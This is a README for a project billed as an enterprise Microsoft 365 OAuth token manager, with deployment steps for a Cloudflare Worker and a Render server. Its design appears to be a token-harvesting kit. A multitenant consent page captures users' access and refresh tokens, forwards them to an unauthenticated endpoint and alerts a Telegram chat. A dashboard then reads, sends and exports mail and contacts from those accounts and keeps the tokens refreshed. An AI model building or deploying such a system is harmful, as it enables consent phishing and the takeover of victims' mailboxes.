# Enterprise Microsoft 365 OAuth Token Management System

A complete, production-ready enterprise IT administration tool for managing
multiple Microsoft 365 OAuth tokens, built with a dual deployment architecture.

---

## 🏗️ Architecture Overview

```
┌─────────────────────────────────────────┐
│          Cloudflare Workers             │
│  ┌─────────────────────────────────┐    │
│  │  OAuth Authorization Handler    │    │
│  │  - Serve auth landing page      │    │
│  │  - Azure AD OAuth 2.0 flow      │    │
│  │  - Extract access/refresh token │    │
│  │  - Store in Cloudflare KV       │    │
│  │  - POST to Render API           │    │
│  │  - Telegram notification        │    │
│  └─────────────────────────────────┘    │
└─────────────────────────────────────────┘
                    │
                    ▼ POST /api/tokens/add
┌─────────────────────────────────────────┐
│              Render (Node.js)           │
│  ┌─────────────────────────────────┐    │
│  │  Admin Dashboard (React)        │    │
│  │  - Login page                   │    │
│  │  - Account list with status     │    │
│  │  - Mailbox viewer               │    │
│  │  - Email compose                │    │
│  │  - Contacts                     │    │
│  └─────────────────────────────────┘    │
│  ┌─────────────────────────────────┐    │
│  │  Express API                    │    │
│  │  - JWT authentication           │    │
│  │  - Token CRUD                   │    │
│  │  - Graph API proxy              │    │
│  │  - Auto-refresh cron job        │    │
│  └─────────────────────────────────┘    │
│  ┌─────────────────────────────────┐    │
│  │  PostgreSQL                     │    │
│  │  - oauth_accounts               │    │
│  │  - admin_users                  │    │
│  └─────────────────────────────────┘    │
└─────────────────────────────────────────┘
```

---

## 📁 Project Structure

```
oauth-token-manager/
├── cloudflare-worker/
│   ├── index.js          # OAuth flow + KV storage
│   ├── wrangler.toml     # Wrangler configuration
│   ├── .env.example      # Environment variables template
│   └── README.md         # Deployment guide
├── server/
│   ├── index.js          # Express app + startup
│   ├── package.json
│   ├── .env.example
│   ├── config/
│   │   └── database.js   # PostgreSQL pool
│   ├── routes/
│   │   ├── auth.js       # Admin login / change-password
│   │   ├── tokens.js     # Token CRUD
│   │   └── mailbox.js    # Graph API proxy routes
│   ├── middleware/
│   │   └── auth.js       # JWT middleware
│   ├── models/
│   │   └── db-schema.sql # Table definitions
│   └── utils/
│       ├── graph-api.js  # Microsoft Graph API helpers
│       ├── telegram.js   # Telegram Bot notifications
│       └── token-refresh.js # Auto-refresh cron job
├── client/
│   ├── public/
│   │   └── index.html
│   └── src/
│       ├── index.js
│       ├── App.js        # Router + Auth/Toast context
│       ├── components/
│       │   ├── Login.js
│       │   ├── Dashboard.js
│       │   ├── AccountCard.js
│       │   ├── Mailbox.js
│       │   ├── EmailComposer.js
│       │   └── DarkModeToggle.js
│       ├── styles/
│       │   └── App.css   # Modern dark/light theme
│       └── utils/
│           └── api.js    # Axios instance
├── render.yaml           # Render one-click deploy
└── README.md
```

---

## 🚀 Quick Start

### Prerequisites

- Node.js 18+
- A Cloudflare account
- A Render account (free tier works)
- Azure AD app registration (see below)
- Telegram bot (optional, for notifications)

---

## 🔐 Azure AD App Registration

1. Go to [Azure Portal → App registrations](https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/RegisteredApps)
2. **New registration** → name it `OAuth Token Manager`
3. Supported account types: **Accounts in any organizational directory (Multitenant)**
4. Redirect URI (Web): `https://<your-worker>.workers.dev/callback`
5. Note **Application (client) ID** → `CLIENT_ID`
6. Note **Directory (tenant) ID** → `TENANT_ID`
7. **Certificates & secrets** → **New client secret** → note value → `CLIENT_SECRET`
8. **API permissions** → Add delegated permissions:
   - `openid`, `profile`, `email`, `offline_access`
   - `Mail.ReadWrite`, `Mail.Send`, `Contacts.Read`
   - Grant admin consent

---

## ☁️ Deploy Cloudflare Workers

```bash
# Install Wrangler
npm install -g wrangler

# Login
wrangler login

# Create KV namespace
wrangler kv:namespace create "TOKENS"
# → Copy the printed id into cloudflare-worker/wrangler.toml

# Set secrets (interactive prompts)
wrangler secret put CLIENT_ID
wrangler secret put CLIENT_SECRET
wrangler secret put TENANT_ID
wrangler secret put BOT_TOKEN        # optional
wrangler secret put CHAT_ID          # optional
wrangler secret put RENDER_API_URL   # https://your-app.onrender.com/api/tokens/add
wrangler secret put REDIRECT_URI     # https://your-worker.workers.dev/callback

# Deploy
cd cloudflare-worker
wrangler publish
```

---

## 🌐 Deploy to Render

### Option A – One-Click (render.yaml)

1. Fork / push this repo to GitHub
2. Go to [Render Dashboard](https://dashboard.render.com) → **New** → **Blueprint**
3. Connect your GitHub repo
4. Render reads `render.yaml` and creates:
   - A **Web Service** (Node.js)
   - A **PostgreSQL** database
5. Set the required environment variables in the Render dashboard:
   - `CLIENT_ID`, `CLIENT_SECRET`, `TENANT_ID`
   - `BOT_TOKEN`, `CHAT_ID`
   - `ADMIN_USERNAME`, `ADMIN_PASSWORD`
   - `JWT_SECRET` (auto-generated)
6. Deploy!

### Option B – Manual

1. **New Web Service** → connect GitHub repo
2. Build command:
   ```
   cd server && npm install && cd ../client && npm install && npm run build
   ```
3. Start command:
   ```
   cd server && npm start
   ```
4. Add a **PostgreSQL** database → `DATABASE_URL` is injected automatically
5. Set all environment variables (see `server/.env.example`)

---

## 🔧 Local Development

```bash
# Clone
git clone https://github.com/papii777/oauth-token-manager.git
cd oauth-token-manager

# Server
cd server
cp .env.example .env   # fill in values
npm install
npm run dev            # nodemon hot-reload

# Client (separate terminal)
cd ../client
npm install
npm start              # CRA dev server on :3000, proxies API to :3000
```

---

## 🌍 Environment Variables

### Cloudflare Worker (`cloudflare-worker/.env.example`)

| Variable        | Description                                     |
|-----------------|-------------------------------------------------|
| `CLIENT_ID`     | Azure AD Application (client) ID               |
| `CLIENT_SECRET` | Azure AD client secret value                   |
| `TENANT_ID`     | Azure AD tenant ID or `common`                 |
| `BOT_TOKEN`     | Telegram Bot API token                         |
| `CHAT_ID`       | Telegram chat ID                               |
| `RENDER_API_URL`| `https://your-app.onrender.com/api/tokens/add` |
| `REDIRECT_URI`  | `https://your-worker.workers.dev/callback`     |

### Render Dashboard (`server/.env.example`)

| Variable         | Description                           |
|------------------|---------------------------------------|
| `DATABASE_URL`   | PostgreSQL connection string (Render) |
| `PORT`           | Server port (default 3000)            |
| `NODE_ENV`       | `production`                          |
| `CLIENT_ID`      | Azure AD client ID                    |
| `CLIENT_SECRET`  | Azure AD client secret                |
| `TENANT_ID`      | Azure AD tenant ID                    |
| `BOT_TOKEN`      | Telegram bot token                    |
| `CHAT_ID`        | Telegram chat ID                      |
| `ADMIN_USERNAME` | Dashboard admin username              |
| `ADMIN_PASSWORD` | Dashboard admin password              |
| `JWT_SECRET`     | Secret for signing JWT tokens (32+ chars) |

---

## 📡 API Reference

### Authentication

| Method | Path                       | Description              |
|--------|----------------------------|--------------------------|
| POST   | `/api/auth/login`          | Admin login → JWT        |
| POST   | `/api/auth/change-password`| Change admin password    |

### Token Management

| Method | Path                        | Auth | Description                  |
|--------|-----------------------------|------|------------------------------|
| POST   | `/api/tokens/add`           | No   | Receive token from Worker    |
| GET    | `/api/tokens`               | Yes  | List all accounts            |
| GET    | `/api/tokens/:id`           | Yes  | Get account details          |
| POST   | `/api/tokens/:id/refresh`   | Yes  | Manually refresh token       |
| DELETE | `/api/tokens/:id`           | Yes  | Delete account               |

### Mailbox (Microsoft Graph Proxy)

| Method | Path                                   | Description            |
|--------|----------------------------------------|------------------------|
| GET    | `/api/mailbox/:id/messages`            | List messages          |
| GET    | `/api/mailbox/:id/message/:msgId`      | Get email content      |
| POST   | `/api/mailbox/:id/send`                | Send email             |
| GET    | `/api/mailbox/:id/contacts`            | Get contacts           |
| GET    | `/api/mailbox/:id/folders`             | List mail folders      |

### Health

| Method | Path      | Description  |
|--------|-----------|--------------|
| GET    | `/health` | Health check |

---

## 🔒 Security Features

- **Password hashing** with bcrypt (cost factor 12)
- **JWT sessions** (8-hour expiry)
- **Rate limiting** – 200 req/15 min on API, 20 req/15 min on login
- **Parameterized SQL queries** (no SQL injection)
- **Environment variables** for all secrets
- **SSL/TLS** enforced in production (Render + Cloudflare)

---

## 📖 Documentation

- [Cloudflare Workers Setup](./cloudflare-worker/README.md)

---

## 📄 License

MIT © 2024 papii777
